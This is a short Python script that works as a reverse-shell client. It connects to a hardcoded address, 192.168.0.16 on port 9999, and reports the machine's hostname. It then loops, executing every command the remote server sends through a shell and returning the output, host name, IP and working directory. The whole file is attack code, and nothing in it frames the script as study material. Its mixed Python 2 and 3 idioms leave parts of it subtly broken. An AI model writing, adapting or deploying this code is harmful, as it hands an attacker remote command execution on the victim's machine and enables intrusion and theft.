import os
import socket
import subprocess
import requests
import httplib, urllib

# Create a socket
def socket_create():
    try:
        global host
        global port
        global s
        host = '192.168.0.16'
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    try:
        global host
        global port
        global s
        #conn = httplib.HTTPConnection(host, port)
        #conn.request("HEAD", "/")
        #s = conn.getresponse()
        s.connect((host,port))
        s.send(str.encode(socket.gethostname()))
    except socket.error as msg:
        print("Socket connection error: " + str(msg) + "\n" + "Retrying...")



# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes).encode("utf-8")
            o_str = output_str + '\n' + socket.gethostname() + '[' + socket.gethostbyname(socket.gethostname()) + ']@' + str(os.getcwd()) + '> '
            s.send(str.encode(o_str))
            print(o_str)
    s.close()


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
